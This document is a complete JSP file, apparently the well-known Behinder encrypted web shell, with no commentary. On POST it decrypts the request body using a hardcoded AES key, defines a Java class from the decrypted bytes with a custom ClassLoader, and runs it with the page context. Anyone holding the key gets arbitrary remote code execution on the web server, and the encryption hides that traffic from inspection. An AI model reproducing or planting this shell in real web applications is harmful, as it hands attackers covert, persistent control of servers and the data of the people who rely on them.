<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}
public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
<%if (request.getMethod().equals("POST")){
String k="e45e329feb5d925b";
session.putValue("u",k);
Cipher c=Cipher.getInstance("AES");
c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
String input= request.getReader().readLine();
new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(input))).newInstance().equals(pageContext);
}%>